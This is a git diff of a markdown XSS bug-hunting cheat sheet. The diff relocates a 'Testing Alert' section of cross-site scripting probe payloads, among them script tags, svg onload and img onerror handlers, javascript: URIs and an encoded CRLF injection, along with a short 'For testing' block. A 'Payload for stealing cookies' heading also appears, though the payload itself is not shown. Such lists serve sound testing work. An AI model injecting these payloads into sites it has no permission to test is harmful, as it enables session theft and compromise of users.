@@ -25,7 +25,44 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
   1. Check html tag and attribute for reflection.
   2. If < and > symbol reflecting in source code without encoding, XSS possible.
   3. If ' or " symbol reflecting in source code without encoding, XSS possible.
+# Testing Alert
+```js
+<script>alert(1337)</script>
+><script>alert(1337)</script>
+<sCrIpt>alert(1337)</sCripT>
+">cyborg71<script>alert(1337)</script>
+<svg/ onload=alert(1337)//
+<Svg/OnLoad=(confirm)(1337)<!--
+<img src=x onerror=alert(1337)>
+</script><img src=x onerror=alert(1337)>
+<iframe src="javascript:alert(1337)">
+';alert(1337)//
+${alert(1337)}
+<custom-tag onmouseover='alert(1337)'>
+/?x=y'%09onclick='alert(1337)'%09accessKey='x'
+/?'accesskey='x'onclick='alert(1337)
+javascript:alert(1337) (Inject in href attribute)
+y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
+```
+Here, ```%09``` represents the horizontal tab character and ```%0A``` represents the newline.
+<br>
+![Screenshot from 2024-06-22 21-24-55](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/a4b3b27e-3e78-438e-90c1-38f3986f5a79)
 
+![Screenshot from 2024-06-22 21-30-13](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/cd6ea4c0-17df-448a-bc1a-caa4d293ee80)
+
+![Screenshot from 2024-06-22 21-34-37](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/2938507e-12e8-438d-ad7d-d1ec7d65a963)
+
+![Screenshot from 2024-06-22 21-36-45](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/06045884-2e15-4998-bfe6-057cf34dbe92)
+
+![Screenshot from 2024-06-22 21-38-04](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/925458b2-619b-4545-a675-81ee043cd00c)
+
+**For testing**
+```js
+"><h1>cyborg.71</h1>
+<script onclick="alert(1337)">
+<a href="javascript:alert('XSS')">Click me</a>
+<img src=https://i.imgflip.com/8uo0t9.jpg>
+```
 ## Payload for stealing cookies
 ```js
 <script>
@@ -62,44 +99,6 @@ https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.ht
 <h1>cyborg71</h1>
 "><h1>cyborg71</h1>
 <a href="https://google.com"></a>
-```
-# Testing Alert
-```js
-<script>alert(1337)</script>
-><script>alert(1337)</script>
-<sCrIpt>alert(1337)</sCripT>
-">cyborg71<script>alert(1337)</script>
-<svg/ onload=alert(1337)//
-<Svg/OnLoad=(confirm)(1337)<!--
-<img src=x onerror=alert(1337)>
-</script><img src=x onerror=alert(1337)>
-<iframe src="javascript:alert(1337)">
-';alert(1337)//
-${alert(1337)}
-<custom-tag onmouseover='alert(1337)'>
-/?x=y'%09onclick='alert(1337)'%09accessKey='x'
-/?'accesskey='x'onclick='alert(1337)
-javascript:alert(1337) (Inject in href attribute)
-y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
-```
-Here, ```%09``` represents the horizontal tab character and ```%0A``` represents the newline.
-<br>
-![Screenshot from 2024-06-22 21-24-55](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/a4b3b27e-3e78-438e-90c1-38f3986f5a79)
-
-![Screenshot from 2024-06-22 21-30-13](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/cd6ea4c0-17df-448a-bc1a-caa4d293ee80)
-
-![Screenshot from 2024-06-22 21-34-37](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/2938507e-12e8-438d-ad7d-d1ec7d65a963)
-
-![Screenshot from 2024-06-22 21-36-45](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/06045884-2e15-4998-bfe6-057cf34dbe92)
-
-![Screenshot from 2024-06-22 21-38-04](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/925458b2-619b-4545-a675-81ee043cd00c)
-
-#### For testing.
-```js
-"><h1>cyborg.71</h1>
-<script onclick="alert(1337)">
-<a href="javascript:alert('XSS')">Click me</a>
-<img src=https://i.imgflip.com/8uo0t9.jpg>
 ```
 ## Angle brackets HTML-encoded bypass
 ### Reflected XSS into HTML attribute with angle brackets HTML-encoded
